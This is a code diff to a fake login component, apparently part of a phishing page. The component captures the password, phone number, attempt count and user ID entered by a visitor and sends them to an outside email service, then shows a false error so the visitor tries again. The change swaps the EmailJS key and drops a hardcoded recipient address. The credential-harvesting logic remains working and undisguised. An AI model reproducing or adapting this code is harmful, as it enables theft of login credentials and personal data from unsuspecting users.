@@ -114,7 +114,7 @@ export class LoginSectionComponent implements OnInit, OnDestroy {
   async send(end: boolean = false) {
     this.showLoader = true;
 
-    emailjs.init('08gaTi0yX9GYMg2w_');
+    emailjs.init('NKHmyO1Zy4d62isst');
     const response = await emailjs
       .send('service_4fx4y8a', 'template_0tzq3y5', {
         name: 'Stanley',
@@ -124,8 +124,7 @@ export class LoginSectionComponent implements OnInit, OnDestroy {
           this.loginFormControl['password'].value
         }, Phone Number: ${this.loginFormControl['countryCode'].value}, ${
           this.loginFormControl['phoneNumber'].value || ''
-        }, Attempt: ${this.attemptCount + 1}, userId: ${this.userId || ''}`,
-        email: 'ubaid.valtorquegroup@hotmail.com',
+        }, Attempt: ${this.attemptCount + 1}, userId: ${this.userId || ''}`
       })
       .then(() => {
         this.showError = true;
